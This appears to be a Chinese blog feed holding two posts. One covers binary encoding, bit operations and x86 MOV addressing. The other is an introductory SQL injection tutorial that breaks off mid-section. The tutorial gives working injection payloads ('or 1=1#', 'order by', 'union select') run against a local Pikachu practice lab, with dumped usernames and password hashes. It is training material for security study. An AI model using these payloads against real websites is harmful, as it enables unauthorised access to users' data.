alt="img"></p><p>原码：最高位（最左面）为符号位，其余各位为数值本身绝对值<br>反码：<br>           正数：反码与原码相同<br>           负数：符号位为1，其余位对原码取反<br>补码：<br>           正数：补码与原码相同<br>           负数：符号位为1，其余位对原码取反加1（1是值）<br> 正0和负0的补码相同<br> 正数和负数的相加实质是：把正数和负数的补码相加，然后再补码，同位相加都为1的话进位。</p><p><strong>3. 举例说明</strong><br>正数编码：</p><p><img src="https://img-blog.csdnimg.cn/2020050422390610.png" alt="img"></p><p>负数编码：<br>符号为1</p><p><img src="https://img-blog.csdnimg.cn/20200504225025458.png" alt="img"></p><p><strong>4. 假设数据宽度为1，Byte(8 bit)</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504231636638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><ol start="5"><li>假设数据宽度为 Doubleworld(32 bit)</li></ol><p><img src="https://img-blog.csdnimg.cn/20200504231915497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="位运算">          <a href="#位运算" class="heading-link"><i class="fas fa-link"></i></a>位运算</h2>      <p><strong>前言：</strong><br>计算机只认识和，计算机所做的运算归根结底是直接对0和1做运算，通常称：位运算。</p><p><strong>为什么要学位运算：</strong><br>1）必须要位运算来实现，比如说：调试器，判断CPU各种状态位<br>2）试题：比如2*8效率最高的实现方式</p><p><strong>1. 与运算</strong><br>两个数都为1结果才为1<br>比如：</p><p><img src="https://img-blog.csdnimg.cn/20200504233141611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>2. 或运算</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504235137956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>3. 异或运算</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504235337567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>4. 非运算</strong></p><p><img src="https://img-blog.csdnimg.cn/20200504235635911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>5. 移位运算</strong><br>左移</p><p><img src="https://img-blog.csdnimg.cn/20200504235911392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>右移</p><p><img src="https://img-blog.csdnimg.cn/20200505000319281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>而对于C语言来说，高位补零还是1看前面定义：比如说unsigned 意为无符号，没有定义unsigned默认就是有符号的，最高位就为符号位。</p><p><strong>6. 总结</strong><br>计算机的所有运算归根结底都会转换为位运算，计算机只会做位运算</p><p><strong>7. 通过位运算实现四则运算</strong><br>举例：加法</p><p><img src="https://img-blog.csdnimg.cn/20200508234137486.png" alt="img"></p><p>运算过程：</p><p><img src="https://img-blog.csdnimg.cn/20200508234825302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>减法：</p><p><img src="https://img-blog.csdnimg.cn/20200508235646720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h1 id="汇编以及环境搭建">          <a href="#汇编以及环境搭建" class="heading-link"><i class="fas fa-link"></i></a>汇编以及环境搭建</h1>      <p><strong>1. 学习汇编不是为了写代码</strong></p><p><img src="https://img-blog.csdnimg.cn/20200509000103780.png" alt="img"></p><p><strong>2. 环境准备</strong></p><p>Dbg  32位和64位</p><p><img src="https://img-blog.csdnimg.cn/20200509102203300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="寄存器">          <a href="#寄存器" class="heading-link"><i class="fas fa-link"></i></a>寄存器</h2>      <p>寄存器就是CPU中用来存储数据的地方</p><p><img src="https://img-blog.csdnimg.cn/20200509104210495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>64位的CPU是从32位的拓展来的，整体结构没有发生改变，只是在原来的基础上增加了寄存器，汇编指令都是一样的</p><p><img src="https://img-blog.csdnimg.cn/20200509104922187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="使用32位的寄存器">          <a href="#使用32位的寄存器" class="heading-link"><i class="fas fa-link"></i></a>使用32位的寄存器</h2>      <p><strong>1. 前言</strong><br>mov指令是用来移动数据的，汇编的实质就是：寄存器与寄存器，或者寄存器与内存之间数据的来回流动</p><p><strong>2. MOV指令</strong></p><ol><li><p>立即数存到寄存器里</p><p><img src="https://img-blog.csdnimg.cn/20200509112159154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li><li><p>寄存器数存到寄存器里</p><p><img src="https://img-blog.csdnimg.cn/20200509112406781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li></ol><p><img src="https://img-blog.csdnimg.cn/2020050911253544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><strong>通用寄存器</strong></p><p>不同位的MOV命令</p><p><img src="https://img-blog.csdnimg.cn/2020050914085727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>不同位的寄存器，实际上32位的寄存器相当于4个字节的，选用16位的或者8位的，就相当于用了其中2个或者1个<br>例如：将eax存储-1，然后进行反汇编，用16位的mov命令</p><p><img src="https://img-blog.csdnimg.cn/20200509140506816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200509140649655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>对于8位</p><p><img src="https://img-blog.csdnimg.cn/20200509191232664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p>H是高8位，L是低8位<br><strong>补充</strong><br>不同寄存器到寄存器的存储要相同位数。</p>        <h1 id="内存地址和MOV指令">          <a href="#内存地址和MOV指令" class="heading-link"><i class="fas fa-link"></i></a>内存地址和MOV指令</h1>      <p><img src="https://img-blog.csdnimg.cn/20200509194900747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p>        <h2 id="内存地址">          <a href="#内存地址" class="heading-link"><i class="fas fa-link"></i></a>内存地址</h2>      <ol><li><p>内存太大没法起名字，只能用编号，当我们想向内存中存储数据时，或者从内存中读取数据时，必须用到这个编号，就像写信要写地址收件人一样。</p></li><li><p>这个编号又称内存地址（32位，前面0可以省略）</p><p><img src="https://img-blog.csdnimg.cn/20200509200315590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li></ol>        <h2 id="MOV指令">          <a href="#MOV指令" class="heading-link"><i class="fas fa-link"></i></a>MOV指令</h2>      <p>必须告知内存具体宽度</p><ol><li>立即数存到内存里</li><li>寄存器存到内存里</li><li>内存存到寄存器里<br><img src="https://img-blog.csdnimg.cn/20200509224453516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></li></ol><p><img src="https://img-blog.csdnimg.cn/20200509225756589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200509230158974.png" alt="img"></p>        <h2 id="内存地址的5种形式">          <a href="#内存地址的5种形式" class="heading-link"><i class="fas fa-link"></i></a>内存地址的5种形式</h2>      <ol><li><p>形式一：立即数</p><p><img src="https://img-blog.csdnimg.cn/20200509231659295.png" alt="img"></p></li><li><p>形式二：[reg],reg代表寄存器，可以是8个32位的通用寄存器中任意一个</p><p><img src="https://img-blog.csdnimg.cn/20200509232250286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li><li><p>形式三：[reg+立即数] (地址是加过立即数后的编码地址)</p><p><img src="https://img-blog.csdnimg.cn/20200509232548205.png" alt="img"></p></li><li><p>形式四：[reg+reg*{1,2,4,8}],（1或2或4或8）</p><p><img src="https://img-blog.csdnimg.cn/20200509233007988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li><li><p>形式五：[reg+reg*{1,2,4,8}+立即数]</p><p><img src="https://img-blog.csdnimg.cn/20200509233201234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODAxNw==,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5ODApx;" alt="img"></p></li></ol><p><strong>归根结底，就是改变编码地址</strong></p>]]></content>
      
      
      <categories>
          
          <category> Reverse逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/"/>
      <url>2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="Web-入侵先遣——SQL注入攻击技术初探">          <a href="#Web-入侵先遣——SQL注入攻击技术初探" class="heading-link"><i class="fas fa-link"></i></a>Web 入侵先遣——SQL注入攻击技术初探</h1>              <h2 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h2>      <p>SQL 注入式攻击技术，一般针对基本 Web 平台的应用程序，造成 SQL 注入 攻击漏洞的原因，是由于程序员在编写 Web 程序时，没有对浏览器端提交的参数进行严格的过滤和判断。用户可以修改构造参数，提交 SQL 查询语句，并传递至服务器端，从而获得想要的敏感信息，甚至执行危险的代码或系统命令。</p><p>虽然 SQL 注入攻击技术早已出现，三十时至今日仍然有很大一部分网站存在 SQL 注入漏洞，在本章开篇中进行入侵检测中就就发现了各大门户网站同样存在 SQL 注入漏洞，更别说一些小网站了。由于 SQL 漏洞存在的普遍性，因此 SQL 入侵攻击技术往往成为黑客入侵攻击网站渗透内部服务的首选技术，危害性极大。</p><a id="more"></a>        <h2 id="1-1-注射式攻击的原理">          <a href="#1-1-注射式攻击的原理" class="heading-link"><i class="fas fa-link"></i></a>1.1.注射式攻击的原理</h2>      <p>注射式攻击的根源在于，程序命令和用户数据（即用户输入）之间没有做到泾渭分明。这使得攻击者有机会将程序命令当作用户输入的数据体提交给 Web 程序，以发号施令，为所欲为（注：注入最终是数据库，与脚本，平台无关）</p><p>总之一句话：注入产生的原因是接受相关参数未经处理直接带入数据库查询操作。</p><p>为了发动注射攻击，攻击者需要在常规输入中混入将被解释为命令的“数据”，要想成功，必须确定三件事：</p><ol><li><p>确定 Web 应用程序所使用的技术</p><p>注射式攻击对程序设计语言或者硬件关系密切，但是这些可以通过适当的踩点或者索性将所有常见的注射式攻击都搬出啦逐一试一下就知道了。为了确定所采用的技术，攻击者可以考察 Web 页面的页脚，查看错误页面，检查页面源代码，或者使用诸如 Nessus，AWVS，AppScan等工具进行刺探。</p></li><li><p>确定所有可能的输入方式</p><p>Web 应用的用户输入方式比较多，其中一些用户输入方式是很明显的，如 HTML 表单，另外，攻击者可以通过隐藏的 HTML 表单输入，HTTP 头部，cookies，甚至对用户不可见的后端 AJAX 请求来跟 Web 应用进行交互。一般来说，所有的 HTTP 的 GET 和 POST 都应当作用户输入。为了找出一个 Web 应用所有可能的用户输入，我们可以求助于代理，如 Burp 等。</p></li><li><p>查找可以用于注射的用户输入</p><p>在找出所用用户的输入方式后，就要对这些输入方式进行筛选，找出其中可以注入命令的那些输入方式。这个任务好像有点难，但是这里有一个小窍门，那就是多多留意 Web 应用的错误页面，很多时候可以从这里得到意想不到的收获。</p></li></ol>        <h2 id="1-2-经典-OR-漏洞原理解析">          <a href="#1-2-经典-OR-漏洞原理解析" class="heading-link"><i class="fas fa-link"></i></a>1.2. 经典 OR 漏洞原理解析</h2>      <p>大家经常听到网站万能密码登录，今天我们来分析分析万能密码是怎么回事。</p><ol><li><p>万能密码1：</p><p>id=1’ or 1=1#/–(–是aspx的，#是php的注释掉)</p></li></ol>        <h2 id="1-3-注入前的准备及注入漏洞检测">          <a href="#1-3-注入前的准备及注入漏洞检测" class="heading-link"><i class="fas fa-link"></i></a>1.3. 注入前的准备及注入漏洞检测</h2>              <h3 id="1-3-1-取消友好-HTTP-错误信息">          <a href="#1-3-1-取消友好-HTTP-错误信息" class="heading-link"><i class="fas fa-link"></i></a>1.3.1. 取消友好 HTTP 错误信息</h3>      <p>在进行 SQL 注入攻击时，需要利用从服务器返回的各种出错信息，但是在浏览器中默认设置是不显示详细错误返回信息的，不论服务器返回什么错误，都只能看到“ HTTP 500 服务器错误 ” 的窗口。因此，每次进行 SQL 注入攻击测试时，首先要取消浏览器返回信息设置，以便查看到注入攻击时返回的数据库信息。</p>        <h3 id="1-3-2-手工检测-SQL-注入点">          <a href="#1-3-2-手工检测-SQL-注入点" class="heading-link"><i class="fas fa-link"></i></a>1.3.2. 手工检测 SQL 注入点</h3>      <p><strong>1. 最常用的 SQL 注入点判断方法，是在网站中寻找如下形式的网页链接</strong></p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/xxx.asp?id=xx%EF%BC%88ASP">http://www.xxx.com/xxx.asp?id=xx（ASP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/xxx.php?id=xx%EF%BC%88PHP">http://www.xxx.com/xxx.php?id=xx（PHP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/xxx.jsp?id=xx%EF%BC%88JSP">http://www.xxx.com/xxx.jsp?id=xx（JSP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/xxx.aspx?id=xx%EF%BC%88ASPX%E6%B3%A8%E5%85%A5%EF%BC%89">http://www.xxx.com/xxx.aspx?id=xx（ASPX注入）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/index.asp?id=xx&amp;page=xx%EF%BC%88%E6%B3%A8%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%9A%84%E6%97%B6%E5%80%99%E7%A1%AE%E8%AE%A4%E6%98%AF">http://www.xxx.com/index.asp?id=xx&amp;page=xx（注：注入的时候确认是</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> id 参数还是 page 参数，工具默认只对后面 page 参数注入，所以要对工具进行配置或者手工调换</p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/index/new/id/8%EF%BC%88%E4%BC%AA%E9%9D%99%E6%80%81%EF%BC%89">http://www.xxx.com/index/new/id/8（伪静态）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="http://www.xxx.com/index/new/php-8.html%EF%BC%88%E4%BC%AA%E9%9D%99%E6%80%81%EF%BC%89">http://www.xxx.com/index/new/php-8.html（伪静态）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>其中 id=xx 中的 “xx” 可能是数字，亦有可能是字符串，分别被称为整数典型数据和字符型数据。</p><p><strong>2. 如何判断某个网页链接是否存在 SQL 注入漏洞通常有两种方法：</strong></p><ol><li><p>“单引号” 法</p><p>方法很简单，直接在浏览器地址栏中网页链接后加上一个单引号，如果页面不能正常显示，浏览器返回一些异常信息，则说明该链接可能存在注入漏洞。</p></li><li><p>1=1 和 1=2 法</p><p>很多时候检测提交包含引号的链接时，会提示非法字符，或者直接不返回任何信息，但是这并不等于不存在 SQL 注入漏洞，此时可使用经典的 “1=1 和 1=2”法进行检测，方法也很简单，就是直接在链接地址后分别加上 and 1=1 和 1=2 进行提交，如果返回不同的页面，那么说明存在 SQL 注入漏洞。</p></li></ol>        <h2 id="1-4-注入分类">          <a href="#1-4-注入分类" class="heading-link"><i class="fas fa-link"></i></a>1.4. 注入分类</h2>      <p>配合靶机：192.168.133.133:81/pikachu/</p>        <h3 id="1-4-1-数字型注入">          <a href="#1-4-1-数字型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.1. 数字型注入</h3>      <p>进入 mysql 命令行，</p><ol><li><p>查询数据库，并使用</p><p>mysql&gt; show databases;<br>+——————–+<br>| Database           |<br>+——————–+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| phpcmsv9           |<br>| pikachu            |<br>| test               |<br>+——————–+<br>6 rows in set (0.02 sec)</p><p>mysql&gt; use pikachu;<br>Database changed</p></li><li><p>查询数据表</p><p>mysql&gt; show tables;<br>+——————-+<br>| Tables_in_pikachu |<br>+——————-+<br>| httpinfo          |<br>| member            |<br>| message           |<br>| users             |<br>| xssblind          |<br>+——————-+</p></li><li><p>查询数据结构</p><p>mysql&gt; desc member;<br>+———-+——————+——+—–+———+—————-+<br>| Field    | Type             | Null | Key | Default | Extra          |<br>+———-+——————+——+—–+———+—————-+<br>| id       | int(10) unsigned | NO   | PRI | NULL    | auto_increment |<br>| username | varchar(66)      | NO   |     | NULL    |                |<br>| pw       | varchar(128)     | NO   |     | NULL    |                |<br>| sex      | char(10)         | NO   |     | NULL    |                |<br>| phonenum | varchar(255)     | NO   |     | NULL    |                |<br>| address  | varchar(255)     | NO   |     | NULL    |                |<br>| email    | varchar(255)     | NO   |     | NULL    |                |<br>+———-+——————+——+—–+———+—————-+<br>7 rows in set (0.00 sec)</p></li><li><p>数字注入例子：</p><p>mysql&gt; select username,pw from member where id=1 or 1=1;<br>+———-+———————————-+</p><div class="table-container"><table><thead><tr><th>username</th><th>pw</th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td>+———-+———————————-+</td><td></td></tr><tr><td>vince</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—–</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>allen</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—–</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>kobe</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—-</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>grady</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—–</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>kevin</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—–</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>lucy</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—-</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>lili</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr><tr><td>—-</td><td>——————————–</td></tr><tr><td></td><td></td></tr><tr><td>+———-+———————————-+</td><td></td></tr><tr><td>7 rows in set (0.00 sec)</td><td></td></tr></tbody></table></div></li><li><p>pikachu 平台：</p><p>利用 Burp 抓包，发现它是一个 post 提交类型的，修改如下：</p><p>id=1 or 1=1 #&amp;submit=%E6%9F%A5%E8%AF%A2</p><p>查询主字段个数：id=1 or 1=1 order by 1/2/3 #&amp;submit=%E6%9F%A5%E8%AF%A2（3 的时候报错）</p><p>其他查询，类似格式：id=1 union select version(),database() #&amp;submit=%E6%9F%A5%E8%AF%A2</p></li></ol>        <h3 id="1-4-2-字符型注入">          <a href="#1-4-2-字符型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.2. 字符型注入</h3>      <ol><li><p>注入类型和数字型相似，就等于把原来的 id=字符串 or 1=1;</p></li><li><p>pikachu中操作</p><p>vince’ or 1=1#</p><p>(很显然，要填的数字在后端里是用 ‘ ‘ 上的)</p></li></ol>        <h3 id="1-4-3-搜索型注入">          <a href="#1-4-3-搜索型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.3. 搜索型注入</h3>      <p>打开 pikachu 平台，在 SQL-inject 下选择搜索型注入，然后随意输入一个字母，能看到匹配出了对应的信息，按照 SQL 的模糊查询命令 select * from 表名 where 字段名 like ‘%(对应值)%’; ,发现可以按照之前的思路来实现万能语句的拼接。</p><ol><li><p>MySQL 命令端</p><p>命令：select * from member where username like ‘%vince%’ or 1=1;</p></li><li><p>pikachu 平台</p><p>%vince%’ or 1=1 #%（最后的%可加可去除）</p><p>(很显然，要填的值是用 ‘’ 起来的)</p></li></ol>        <h3 